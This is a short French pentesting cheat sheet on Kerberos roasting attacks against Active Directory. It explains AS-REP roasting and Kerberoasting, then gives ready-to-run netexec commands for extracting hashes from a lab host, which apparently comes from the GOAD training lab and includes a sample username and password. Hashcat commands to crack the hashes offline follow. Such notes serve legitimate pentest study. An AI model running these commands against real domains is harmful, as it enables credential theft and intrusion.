# Roasting

## AS-REP roasting

Attaque sur les étapes KRB\_AS\_REQ et KRB\_AS\_REP du protocole Kerberos\
Si un utilisateur possède l’attribut DONT\_REQ\_PREAUTH dans l’UAC\
Alors l’envoi du timestamp lors de KRB\_AS\_REQ n’est pas nécessaire\
N’importe qui peut forger une demande KRB\_AS\_REQ pour un utilisateur arbitraire

### Extraction&#x20;

```bash
nxc ldap 192.168.56.11 -u north_users.txt -p '' --asreproast asreproast.txt
```

### Cracker les hashs hors-ligne

```bash
hashcat -m18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```

## Kerberoasting

Attaque sur l’étape **KRB\_TGS\_REP**\
Nécessite un compte utilisateur sans privilèges particulier\
Basé sur le mécanisme de ticket de service\
N’importe quel utilisateur du domaine peut demander un ticket de service pour un compte possédant un SPN (Service Principal Name) à partir de son TGT\
Le KDC va alors vérifier la validité du TGT en le déchiffrant et répondre avec un message KRB\_TGS\_REP dont une partie de la réponse est chiffrée avec le hash du compte de service.\
La réponse peut être ensuite cassée hors-ligne.

### Extraction

```bash
nxc ldap 192.168.56.11 -u 'brandon.stark' -p 'iseedeadpeople' --kerberoasting kerberoasting.txt
```

### Cracker les hashs hors-ligne

```bash
hashcat -m13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
```

### Targeted Kerberoasting

Si on possède un compte avec les droits genericWrite (ou genericAll), on peut alors ajouter un SPN à un compte n'en possédant pas déjà pour le rendre vulnérable à cette attaque
